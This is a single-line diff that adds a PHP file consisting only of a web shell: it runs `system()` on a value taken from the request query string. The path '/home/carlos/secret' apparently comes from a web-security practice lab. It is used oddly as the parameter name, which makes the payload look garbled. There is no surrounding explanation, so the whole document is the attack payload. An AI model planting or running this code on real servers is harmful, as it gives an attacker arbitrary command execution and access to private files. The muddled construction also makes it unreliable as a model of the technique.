@@ -1,0 +1,1 @@
+<?php echo system($_GET['/home/carlos/secret']); ?>
